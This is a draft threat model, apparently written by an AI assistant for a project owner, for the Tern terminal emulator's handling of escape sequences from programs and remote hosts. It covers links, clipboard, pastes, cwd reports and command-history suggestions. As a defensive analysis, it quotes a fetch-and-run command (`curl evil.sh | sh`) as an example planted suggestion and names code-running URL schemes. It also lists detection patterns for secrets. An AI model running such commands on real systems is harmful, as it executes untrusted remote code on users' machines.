---
status: draft
date: 2026-11-05
author: Claude (T-021), for review by the owner
related: [spec 0002, spec 0003, spec 0021, architecture §Security 1 and 2, T-002, T-105, OQ-017]
---

# Threat model: escape sequences from programs and remote hosts

## 1. Component overview

What terminal output can make Tern do. Anything that prints into a
pane is untrusted: a local program, a file someone `cat`s, a git log with
crafted messages, and every remote host behind `ssh`, jump hosts included.
`alacritty_terminal` (vte 0.15) parses the bytes into the grid and raises
events; Tern decides what each one may do. T-002 builds most of what
is open here: links, cwd tracking, copy and paste.

```
              TB1: bytes                    TB2: parsed               TB3: OS
program, ────────────────► alacritty_terminal ───────► pane ──open───► URL handler
remote host                 (vte: OSC 0/2, 4, 8,       │  └─copy/───► clipboard,
   ▲                         10-12, 52, 104, 112;      │    paste       primary selection
   │                         CSI queries)              │
   │  TB4: program input                               │ title ──► tab bar, session.json
   └──────────────── replies (DA, DSR, sizes, colors) ◄┘ cwd   ──► new splits, session.json
                     pasted text ◄──────────── user
```

vte 0.15 has no OSC 7 handler, so cwd reports need a scanner of Tern's
own on the PTY bytes (T-002); spec 0002 is corrected to say so. The
replies alacritty_terminal writes back are fixed strings and numbers: no
title report (CSI 21 t) and no setting reports that echo text.

**Command history (spec 0021, T-105).** The same scanner reads two
Tern-private reports that the opt-in snippets send in a local pane: where
the prompt's input starts, and the shell's newest history entry. They
feed the command history (`history.jsonl`) and the inline suggestion,
which goes back to the program as typed text when the user presses
Right. That is a new path from output to stored data to program input
(TB1 → TB2 → TB4), so it gets its own rows, TM-escape-14 to -19.

## 2. Data classification

| Data | Category (GDPR) | Special constraints | Storage | Retention |
|---|---|---|---|---|
| Terminal output: titles, link targets, cwd reports | Art. 4(1) where it names people, hosts or paths; untrusted | Plain text only; never logged (architecture §Ground rules) | Memory; title and cwd per pane in `session.json` (spec 0003) | Pane lifetime; session overwritten on save |
| Clipboard and primary selection | Art. 4(1), may hold secrets (copied passwords, tokens) | Never sent to a program by an escape sequence | The OS's | The OS's |
| Pasted text | As the clipboard | Reaches the program only as the user's paste | Not stored | Not stored |
| Command history | Art. 4(1): hosts, paths and names in commands; may hold secrets despite the filters | Never-stored rules and token patterns (spec 0021); never logged; never executed | `<data_local_dir>/tern/history.jsonl`, `0600` on Linux; or memory only | Until cleared or `command_history` is `memory` or `off` |
| History token | Not personal; a capability | Only in local panes' environment, never stored or logged | Memory, the panes' environment | One app run |

No sector law applies, and nothing leaves the device except what the
user's own programs send.

## 3. STRIDE walkthrough

Elements: output → parser (TB1), parser → pane actions (TB2), pane → OS
handler and clipboard (TB3), pane → program input (TB4).

| ID | STRIDE | Threat | Affected element | Impact | Likelihood | Mitigation | Status |
|---|---|---|---|---|---|---|---|
| TM-escape-01 | Spoofing | A title (OSC 0/2) poses as another host or as a system prompt in the tab bar, so the user types a secret into the wrong tab. | TB2 title | M | L | Titles are plain text on one line, capped at 200 characters, with control, invisible and direction characters stripped (spec 0003), saved and restored titles too. | mitigated (T-003, T-006) |
| TM-escape-02 | Spoofing | An OSC 8 link's text names one site while it points at another (phishing). | TB2 → TB3 link | H | M | A link opens only on the user's click: Ctrl/Cmd+click by default, or a plain click with `open_links: click` (the owner's choice, 2026-11-05). Hovering shows its real target as plain text before that; a host with non-ASCII letters is marked as such, since look-alike letters can't be told apart, and a `\` ends the host as browsers read it (spec 0002). | mitigated (T-002) |
| TM-escape-03 | Elevation of privilege | A link with another scheme (`file:`, `javascript:`, `ms-msdt:`, an app's own handler like `vscode:`) runs code through the OS handler. | TB3 URL handler | H | M | Only `http` and `https` targets, checked case-insensitively on the parsed URL, are links at all; nothing else reaches the OS handler [load-bearing]. They open through GPUI's `open_url`, never a shell. | open (T-002) |
| TM-escape-04 | Tampering | Output writes the clipboard (OSC 52) with a command the user pastes later. | TB2 → TB3 clipboard | H | M | `ClipboardStore` is ignored: clipboard writes from the terminal are off (architecture §Security 1, spec 0002). | mitigated (T-010); T-002 pins it with a test |
| TM-escape-05 | Information disclosure | Output asks for the clipboard (OSC 52 `?`), and the reply leaks what the user copied to the program or remote host. | TB3 → TB4 | H | M | `ClipboardLoad` is never answered [load-bearing]. | mitigated (T-010); T-002 pins it with a test |
| TM-escape-06 | Tampering | A query's reply carries text the program chose (a title report), and the shell runs it as typed input. | TB4 replies | H | L | Replies are fixed strings and numbers only: device attributes, status, cursor position, modes, sizes and the theme's colors as `rgb:` values. Tern adds no reply that echoes terminal text. | mitigated (T-010); T-002 pins it with a test |
| TM-escape-07 | Tampering | Pasted text holds `ESC [201~`, ending bracketed paste early, so the rest runs as typed commands (pastejacking from a web page). | TB4 paste | H | M | Paste drops ESC and every other control character but tab, `\n` and `\r`, then wraps the text in `ESC [200~ … ESC [201~` when the program asked for bracketed paste (spec 0002). | open (T-002) |
| TM-escape-08 | Tampering | Without bracketed paste, each pasted line runs as it arrives. | TB4 paste | M | L | Current bash, zsh, fish and PowerShell turn bracketed paste on; without it Tern pastes like xterm. A multi-line paste warning is *Later* (spec 0002). | accepted pending OQ-017 |
| TM-escape-09 | Spoofing | A program or remote host reports a cwd (OSC 7) so that new local panes start where it chose. | TB2 cwd | M | L | OSC 7 counts only in a local pane, as a `file://` URL whose host is empty, `localhost` or this machine's name, naming an existing local directory; an SSH pane's reports set no local cwd (spec 0002); their path only picks the folder that pane's SFTP session lists first on that same host, where a lie shows a folder the user can already reach, and a failed listing falls back to home (spec 0008). On Windows only a drive path counts, so checking a report never reaches the network (UNC). | mitigated (T-022) |
| TM-escape-10 | Denial of service | Huge OSC strings (titles, link targets, cwd reports), floods of links or title changes eat memory or CPU. | TB1, TB2 | M | L | Titles capped at 200 characters; link targets used only up to 2 KiB and cwd reports up to 4 KiB, longer ones ignored; only visible rows are drawn; title changes redraw once per frame and save debounced (spec 0003). | open (T-002) |
| TM-escape-11 | Information disclosure | Color, size and device queries tell the program or remote host the theme's colors, the window size and the terminal type. | TB4 replies | L | H | Needed by vim, tmux and others, and no personal data. | accepted pending OQ-017 |
| TM-escape-12 | Tampering | Copied text holds what the screen didn't show (zero-width or direction-override characters, text in the background color), so a pasted command does more than it looked. | TB3 copy | M | L | Copy drops zero-width and direction-override characters. Text drawn in the background color is copied as is: the terminal can't tell intent. | open (T-002); the rest accepted pending OQ-017 |
| TM-escape-13 | Elevation of privilege | The app runs a path or command named in output (a "link" to a script, a cwd that triggers code). | TB3 | H | L | Nothing from output is ever executed; only `http`/`https` links open (architecture §Security 2). | mitigated (by design) |
| TM-escape-14 | Spoofing | Output (a `cat`ed file, a git log, a remote host behind `ssh` in a local pane) carries a forged last-command report, so a planted command such as `curl evil.sh \| sh` becomes a suggestion. | TB1 → TB2 history | H | M | A report counts only with the per-run `TERN_HISTORY_TOKEN`, which only local panes' environments carry; SSH profile panes get none, and a remote host never sees the local one [load-bearing]. A planted command still only shows as grey text and runs only if the user accepts and presses Enter (TM-escape-17). | open (T-106) |
| TM-escape-15 | Information disclosure | A program the user runs in a local pane reads the token from its environment and forges reports. | TB2 history | M | L | Accepted: such a program already runs with the user's rights and could write `history.jsonl` or type into the shell itself. The token is per run and never stored or logged. | accepted (spec 0021) |
| TM-escape-16 | Information disclosure | A command holding a secret (`mysql -p…`, a bearer token, a JWT, `user:pass@` in a URL) lands in `history.jsonl` in plain text, where backups, sync tools or other local programs read it. | history file | H | M | Never stored, in memory or on disk: commands starting with whitespace, multi-line, over 4 KiB, with `password`/`passwd`/`secret`/`token`/`apikey`/`api_key`, or matched by the token patterns (JWT, `Authorization:`/`Bearer`/`Basic`, known prefixes, URL credentials, 32+ hex/base64 characters) [load-bearing]. The shell's own opt-outs apply first. The file is `0600` on Linux and in non-roaming `%LOCALAPPDATA%` on Windows; `command_history: memory \| off` and **Clear command history** delete it. Residual: a secret the patterns miss. | open (T-106) |
| TM-escape-17 | Tampering | Accepting a suggestion sends text the shell runs: control characters or a newline in the entry execute it without Enter. | TB4 accept | H | L | Multi-line commands are never stored; accepting writes only the printable rest of the entry as typed text, drops control characters and never sends Enter [load-bearing]; Right with nothing shown reaches the shell unchanged (spec 0021, flow 4). | open (T-107) |
| TM-escape-18 | Spoofing | A forged input-start report moves where Tern thinks the prompt's input begins, so a suggestion shows while a program (not the shell) waits for input, or over text the program drew. | TB2 prompt state | L | L | Input-start reports need the token too (TM-escape-14); Enter, `Ctrl+C`, the alternate screen, scrolled-up views and non-blank cells after the cursor all hide suggestions (spec 0021, flow 3). | open (T-107, OQ-041) |
| TM-escape-19 | Denial of service | A flood of reports or a huge history file makes recording, loading or matching slow, on the UI thread or at boot. | TB2, history file | M | L | Reports over 4 KiB are ignored; one history of 5 000 distinct commands per shell kind; the file loads on the history thread after the first frame and is compacted past twice the cap; matching reads only the input's rows and the in-memory list, never scrollback [load-bearing]. | open (T-106, T-107) |

Repudiation has no row: Tern keeps no record of terminal output, by
design (PTY bytes are never logged), so there is no trail to falsify, and
nothing here acts in anyone's name. The command history isn't an audit
trail either: it holds what the shells reported, unsigned and editable by
the user, and nothing relies on it as proof.

## 4. Mitigation tasks

- [ ] T-002 — builds TM-escape-02, -03, -07, -10 and -12 as spec 0002
  now states them, and pins -04, -05 and -06 with tests
- [x] T-022 — builds TM-escape-09 with OSC 7 tracking (OQ-018)
- [ ] T-106 — builds TM-escape-14, -16 and the recording half of -19
- [ ] T-107 — builds TM-escape-17, -18 and the matching half of -19

## 5. Accepted risks

Pending the owner's sign-off in OQ-017: TM-escape-08 (multi-line paste
without bracketed paste), TM-escape-11 (query replies), and the rest of
TM-escape-12 (text in the background color). Until then T-002 builds them
the way other terminals do, which is the conservative choice: refusing
them would break vim, tmux and plain pasting.

TM-escape-15 (a program in a local pane reading the history token) is
accepted with spec 0021's approval (2026-11-24): that program already runs
with the user's rights. So is TM-escape-16's residual, a secret none of
the patterns recognizes; the user's defenses are the shell's own opt-outs,
`command_history: memory | off` and **Clear command history**.
